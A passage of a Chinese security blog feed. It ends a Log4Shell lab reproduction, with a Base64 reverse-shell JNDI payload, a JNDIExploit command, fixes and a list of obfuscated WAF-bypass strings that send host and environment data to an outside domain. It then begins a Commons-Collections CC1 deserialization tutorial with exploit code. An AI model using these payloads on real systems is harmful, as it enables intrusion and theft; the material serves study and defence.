c</p><h2 id="4-漏洞复现"><a href="#4-漏洞复现" class="headerlink" title="4. 漏洞复现"></a>4. 漏洞复现</h2><p>使用 dnslog 探测是否存在漏洞</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">c=${jndi:ldap://ug8wgc.dnslog.cn/} <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../../../../../../pic/Pasted%20image%2020220803124605.png"></p><p>在平台上获取到响应</p><p><img src="/../../../../../../pic/Pasted%20image%2020220803124626.png"></p><p>存在 JNDI 注入，使用<a href="https://github.com/zzwlpx/JNDIExploit.git">工具</a>起一个  JNDI 服务</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">java</span> <span class="token parameter variable">-jar</span> JNDIExploit-1.0-SNAPSHOT.jar <span class="token parameter variable">-i</span> <span class="token number">172.19</span>.46.113 <span class="token parameter variable">-l</span> <span class="token number">1389</span> <span class="token parameter variable">-p</span> <span class="token number">8091</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../../../../../../pic/Pasted%20image%2020220803124923.png"></p><p>构造 payload</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">c=${jndi:ldap://172.19.46.113:1389/TomcatBypass/Command/Base64/YmFzaCAtaSA%252bJiAvZGV2L3RjcC8xNzIuMTkuNDYuMTEzLzEwMDEwIDA%252bJjE=} # Base64 编码后 + 需要 URL 编码两次后发送<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>发送后获得 shell</p><p><img src="/../../../../../../pic/Pasted%20image%2020220803125535.png"></p><h2 id="5-修复建议"><a href="#5-修复建议" class="headerlink" title="5. 修复建议"></a>5. 修复建议</h2><ol><li>更新log4j至 rc2(<a href="https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc2">https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc2</a>)</li><li>配置防火墙策略，禁止主动连接外网设备</li><li>升级受影响的应用及组件</li><li>过滤相关的关键词，比如${jndi://*}</li></ol><h2 id="6-绕过"><a href="#6-绕过" class="headerlink" title="6. 绕过"></a>6. 绕过</h2><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">${jndi:ldap://127.0.0.1:1389/ badClassName} ${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://nsvi5sh112ksf1bp1ff2hvztn.l4j.zsec.uk/sploit} ${${::-j}ndi:rmi://nsvi5sh112ksf1bp1ff2hvztn.l4j.zsec.uk/sploit} ${jndi:rmi://nsvi5sh112ksf1bp1ff2hvztn.l4j.zsec.uk}${${lower:jndi}:${lower:rmi}://nsvi5sh112ksf1bp1ff2hvztn.l4j.zsec.uk/sploit} ${${lower:${lower:jndi}}:${lower:rmi}://nsvi5sh112ksf1bp1ff2hvztn.l4j.zsec.uk/sploit} ${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://nsvi5sh112ksf1bp1ff2hvztn.l4j.zsec.uk/sploit}${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://nsvi5sh112ksf1bp1ff2hvztn.l4j.zsec.uk/sploit}${${upper:jndi}:${upper:rmi}://nsvi5sh112ksf1bp1ff2hvztn.l4j.zsec.uk/sploit} ${${upper:j}${upper:n}${lower:d}i:${upper:rmi}://nsvi5sh112ksf1bp1ff2hvztn.l4j.zsec.uk/sploit}${${upper:j}${upper:n}${upper:d}${upper:i}:${lower:r}m${lower:i}}://nsvi5sh112ksf1bp1ff2hvztn.l4j.zsec.uk/sploit}${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://${hostName}.nsvi5sh112ksf1bp1ff2hvztn.l4j.zsec.uk}${${upper::-j}${upper::-n}${::-d}${upper::-i}:${upper::-l}${upper::-d}${upper::-a}${upper::-p}://${hostName}.nsvi5sh112ksf1bp1ff2hvztn.l4j.zsec.uk}${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://${hostName}.${env:COMPUTERNAME}.${env:USERDOMAIN}.${env}.nsvi5sh112ksf1bp1ff2hvztn.l4j.zsec.uk<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Log4j </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java 反序列化 Commons-Collections 篇 CC1 链</title>
      <link href="/2023/01/21/skilllearning/java-an-quan/java-fan-xu-lie-hua/commons-collections-pian/java-fan-xu-lie-hua-commons-collections-pian-cc1-lian/"/>
      <url>/2023/01/21/skilllearning/java-an-quan/java-fan-xu-lie-hua/commons-collections-pian/java-fan-xu-lie-hua-commons-collections-pian-cc1-lian/</url>
      
        <content type="html"><![CDATA[<h1 id="Java-反序列化-Commons-Collections-篇-CC1-链"><a href="#Java-反序列化-Commons-Collections-篇-CC1-链" class="headerlink" title="Java 反序列化 Commons-Collections 篇 CC1 链"></a>Java 反序列化 Commons-Collections 篇 CC1 链</h1><h2 id="1-前言"><a href="#1-前言" class="headerlink" title="1. 前言"></a>1. 前言</h2><p>Commons Collections 是一个扩展了 Java 标准库里的 Collection 结构的第三方基础库，提供了很多强大的数据结构类型和实现了各种集合工具类，作为 Apache 开放项目的重要组件，Commons-Collections 被广泛的用于各种 Java 应用的开发</p><h2 id="2-环境搭建"><a href="#2-环境搭建" class="headerlink" title="2. 环境搭建"></a>2. 环境搭建</h2><ul><li><a href="https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html">jdk8u65</a></li><li><a href="https://hg.openjdk.org/jdk8u/jdk8u/jdk/rev/af660750b2f4">openJDK8u65</a></li><li><a href="https://maven.apache.org/docs/history.html">Maven 3.8.7</a></li><li>commons-collections 3.2.1</li></ul><p>导入 Commons-Collections 的包</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>commons-collections<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>commons-collections<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>3.2.1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="3-TransformedMap-版-CC1-链分析"><a href="#3-TransformedMap-版-CC1-链分析" class="headerlink" title="3. TransformedMap 版 CC1 链分析"></a>3. TransformedMap 版 CC1 链分析</h2><p>先寻找到一个危险方法，毕竟在没有危险方法可以利用的情况下讨论啥都白搭（没用）</p><h3 id="3-1-危险方法"><a href="#3-1-危险方法" class="headerlink" title="3.1 危险方法"></a>3.1 危险方法</h3><p>根据前人的总结，先查看下 Transformer 接口</p><ul><li>Transformer 关键代码</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">Transformer</span> <span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token class-name">Object</span> <span class="token function">transform</span><span class="token punctuation">(</span><span class="token class-name">Object</span> input<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>声明了一个 <code>transform</code> 方法，查看哪个类实现了可以利用的地方，这里找到了 <code>InvokerTransformer</code> 类</p><ul><li>InvokerTransformer 关键代码</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">InvokerTransformer</span> <span class="token keyword">implements</span> <span class="token class-name">Transformer</span><span class="token punctuation">,</span> <span class="token class-name">Serializable</span> <span class="token punctuation">{</span>        <span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token class-name">String</span> iMethodName<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span> iParamTypes<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> iArgs<span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token class-name">String</span> methodName<span class="token punctuation">,</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span> paramTypes<span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">super</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        iMethodName <span class="token operator">=</span> methodName<span class="token punctuation">;</span>        iParamTypes <span class="token operator">=</span> paramTypes<span class="token punctuation">;</span>        iArgs <span class="token operator">=</span> args<span class="token punctuation">;</span>    <span class="token punctuation">}</span>        <span class="token keyword">public</span> <span class="token class-name">Object</span> <span class="token function">transform</span><span class="token punctuation">(</span><span class="token class-name">Object</span> input<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>input <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            <span class="token comment">// 通过类执行指定方法</span>            <span class="token class-name">Class</span> cls <span class="token operator">=</span> input<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">Method</span> method <span class="token operator">=</span> cls<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span>iMethodName<span class="token punctuation">,</span> iParamTypes<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> method<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>input<span class="token punctuation">,</span> iArgs<span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">NoSuchMethodException</span> ex<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">FunctorException</span><span class="token punctuation">(</span><span class="token string">"InvokerTransformer: The method '"</span> <span class="token operator">+</span> iMethodName <span class="token operator">+</span> <span class="token string">"' on '"</span> <span class="token operator">+</span> input<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"' does not exist"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IllegalAccessException</span> ex<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">FunctorException</span><span class="token punctuation">(</span><span class="token string">"InvokerTransformer: The method '"</span> <span class="token operator">+</span> iMethodName <span class="token operator">+</span> <span class="token string">"' on '"</span> <span class="token operator">+</span> input<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"' cannot be accessed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">InvocationTargetException</span> ex<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">FunctorException</span><span class="token punctuation">(</span><span class="token string">"InvokerTransformer: The method '"</span> <span class="token operator">+</span> iMethodName <span class="token operator">+</span> <span class="token string">"' on '"</span> <span class="token operator">+</span> input<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"' threw an exception"</span><span class="token punctuation">,</span> ex<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看到 <code>InvokerTransformer.transform()</code> 其中可以调用指定类的指定方法，且参数可控，先写个简单的 Exp 测试一下</p><ul><li>Exploit.java</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">org<span class="token punctuation">.</span>example</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">InvokerTransformer</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Exploit</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment">// 执行目标方法</span>        <span class="token class-name">InvokerTransformer</span> invokerTransformer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"calc"</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 利用 transform 方法调用</span>        invokerTransformer<span class="token punctuation">.</span><span class="token function">transform</span><span class="token punctuation">(</span><span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行截图</p><p><img src="/../../../../../pic/image-20230121235756785.png"></p><p>成功弹出了计算器，下一步的目标是去寻找哪里调用了 <code>transform()</code> 方法</p><h3 id="3-2-上级链子"><a href="#3-2-上级链子" class="headerlink" title="3.2 上级链子"></a>3.2 上级链子</h3><p>右键查找用法</p><p><img src="/../../../../../pic/image-20230122000222469.png"></p><p>可以看到 <code>LazyMap</code> 中也调用了该方法，这个一会讨论</p><p>节省下时间直接跟进 <code>TransformedMap.checkSetValue()</code> 方法</p><ul><li>TransformedMap 关键代码</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">TransformedMap</span> <span class="token keyword">extends</span> <span class="token class-name">AbstractInputCheckedMapDecorator</span> <span class="token keyword">implements</span> <span class="token class-name">Serializable</span> <span class="token punctuation">{</span>        <span class="token keyword">protected</span> <span class="token keyword">final</span> <span class="token class-name">Transformer</span> keyTransformer<span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">Map</span> <span class="token function">decorate</span><span class="token punctuation">(</span><span class="token class-name">Map</span> map<span class="token punctuation">,</span> <span class="token class-name">Transformer</span> keyTransformer<span class="token punctuation">,</span> <span class="token class-name">Transformer</span> valueTransformer<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">TransformedMap</span><span class="token punctuation">(</span>map<span class="token punctuation">,</span> keyTransformer<span class="token punctuation">,</span> valueTransformer<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">protected</span> <span class="token class-name">Object</span> <span class="token function">checkSetValue</span><span class="token punctuation">(</span><span class="token class-name">Object</span> value<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> valueTransformer<span class="token punctuation">.</span><span class="token function">transform</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>checkSetValue()</code> 不能直接进行调用，继续向上找哪里使用了该方法</p><ul><li>AbstractInputCheckedMapDecorator 关键代码</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name">AbstractInputCheckedMapDecorator</span> <span class="token keyword">extends</span> <span class="token class-name">AbstractMapDecorator</span> <span class="token punctuation">{</span>    <span class="token keyword">static</span> <span class="token keyword">class</span> <span class="token class-name">MapEntry</span> <span class="token keyword">extends</span> <span class="token class-name">AbstractMapEntryDecorator</span> <span class="token punctuation">{</span>        <span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token class-name">AbstractInputCheckedMapDecorator</span> parent<span class="token punctuation">;</span>        <span class="token keyword">protected</span> <span class="token class-name">MapEntry</span><span class="token punctuation">(</span><span class="token class-name">Map<span class="token punctuation">.</span>Entry</span> entry<span class="token punctuation">,</span> <span class="token class-name">AbstractInputCheckedMapDecorator</span> parent<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">super</span><span class="token punctuation">(</span>entry<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">this</span><span class="token punctuation">.</span>parent <span class="token operator">=</span> parent<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">public</span> <span class="token class-name">Object</span> <span class="token function">setValue</span><span class="token punctuation">(</span><span class="token class-name">Object</span> value<span class="token punctuation">)</span> <span class="token punctuation">{</span>            value <span class="token operator">=</span> parent<span class="token punctuation">.</span><span class="token function">checkSetValue</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> entry<span class="token punctuation">.</span><span class="token function">setValue</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在 <code>MapEntry.setValue()</code> 中调用了 <code>AbstractInputCheckedMapDecorator.checkSetValue()</code> ，且 <code>TransformedMap</code> 继承了该类，因此可以通过此处调用 <code>TransformedMap.checkSetValue()</code>，继续向上找y</p><p><img src="/../../../../../pic/image-20230122005644321.png"></p><p>最后找到了 <code>AnnotationInvocationHandler</code> </p><ul><li>AnnotationInvocationHandler 关键代码</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">class</span> <span class="token class-name">AnnotationInvocationHandler</span> <span class="token keyword">implements</span> <span class="token class-name">InvocationHandler</span><span class="token punctuation">,</span> <span class="token class-name">Serializable</span> <span class="token punctuation">{</span>    <span class="token class-name">AnnotationInvocationHandler</span><span class="token punctuation">(</span><span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span> <span class="token keyword">extends</span> <span class="token class-name">Annotation</span><span class="token punctuation">&gt;</span></span> type<span class="token punctuation">,</span> <span class="token class-name">Map</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">&gt;</span></span> memberValues<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">[</span><span class="token punctuation">]</span> superInterfaces <span class="token operator">=</span> type<span class="token punctuation">.</span><span class="token function">getInterfaces</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>type<span class="token punctuation">.</span><span class="token function">isAnnotation</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">||</span>                superInterfaces<span class="token punctuation">.</span>length <span class="token operator">!=</span> <span class="token number">1</span> <span class="token operator">||</span>                superInterfaces<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span>Annotation</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">AnnotationFormatError</span><span class="token punctuation">(</span><span class="token string">"Attempt to create proxy for a non-annotation type."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>type <span class="token operator">=</span> type<span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>memberValues <span class="token operator">=</span> memberValues<span class="token punctuation">;</span>    <span class="token punctuation">}</span>        <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">readObject</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span>ObjectInputStream</span> s<span class="token punctuation">)</span>        <span class="token keyword">throws</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span>IOException</span><span class="token punctuation">,</span> <span class="token class-name">ClassNotFoundException</span> <span class="token punctuation">{</span>        s<span class="token punctuation">.</span><span class="token function">defaultReadObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">AnnotationType</span> annotationType <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            annotationType <span class="token operator">=</span> <span class="token class-name">AnnotationType</span><span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span>type<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span><span class="token punctuation">(</span><span class="token class-name">IllegalArgumentException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span>InvalidObjectException</span><span class="token punctuation">(</span><span class="token string">"Non-annotation type in annotation serial stream"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token class-name">Map</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">Class</span><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">&gt;</span><span class="token punctuation">&gt;</span></span> memberTypes <span class="token operator">=</span> annotationType<span class="token punctuation">.</span><span class="token function">memberTypes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">Map<span class="token punctuation">.</span>Entry</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">&gt;</span></span> memberValue <span class="token operator">:</span> memberValues<span class="token punctuation">.</span><span class="token function">entrySet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token class-name">String</span> name <span class="token operator">=</span> memberValue<span class="token punctuation">.</span><span class="token function">getKey</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">&gt;</span></span> memberType <span class="token operator">=</span> memberTypes<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>memberType <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token comment">// i.e. member still exists</span>                <span class="token class-name">Object</span> value <span class="token operator">=</span> memberValue<span class="token punctuation">.</span><span class="token function">getValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span>memberType<span class="token punctuation">.</span><span class="token function">isInstance</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span> <span class="token operator">||</span>                      value <span class="token keyword">instanceof</span> <span class="token class-name">ExceptionProxy</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    memberValue<span class="token punctuation">.</span><span class="token function">setValue</span><span class="token punctuation">(</span>                        <span class="token keyword">new</span> <span class="token class-name">AnnotationTypeMismatchExceptionProxy</span><span class="token punctuation">(</span>                            value<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"["</span> <span class="token operator">+</span> value <span class="token operator">+</span> <span class="token string">"]"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">setMember</span><span class="token punctuation">(</span>                                annotationType<span class="token punctuation">.</span><span class="token function">members</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这岂不是很完美，使用 MapEntry 遍历并且直接在 readObject 中调用了目标方法，但是要调用目标方法还需要绕过两个if</p><p><img src="/../../../../../pic/image-20230104000023.png"> </p><p>该类继承了 InvocationHandler，也就意味着可以通过动态代理进行调用，不过这里暂时用不到</p><p>由此得出链</p><h3 id="3-3-完整链子"><a href="#3-3-完整链子" class="headerlink" title="3.3 完整链子"></a>3.3 完整链子</h3><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token operator">-&gt;</span> <span class="token class-name">AnnotationInvocationHandler</span><span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-&gt;</span> <span class="token class-name">MapEntry</span><span class="token punctuation">.</span><span class="token function">setValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-&gt;</span> <span class="token class-name">TransformedMap</span><span class="token punctuation">.</span><span class="token function">checkSetValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-&gt;</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">.</span><span class="token function">transform</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="4-TransformedMap-版-CC1-链手写-EXP"><a href="#4-TransformedMap-版-CC1-链手写-EXP" class="headerlink" title="4. TransformedMap 版 CC1 链手写 EXP"></a>4. TransformedMap 版 CC1 链手写 EXP</h2><p>这里还需要解决三个问题</p><ul><li>Runtime 的序列化</li><li>if 的绕过</li><li>setValue 的值传递</li></ul><h3 id="4-1-Runtime-序列化"><a href="#4-1-Runtime-序列化" class="headerlink" title="4.1 Runtime 序列化"></a>4.1 Runtime 序列化</h3><p>查看 <code>Runtime</code> 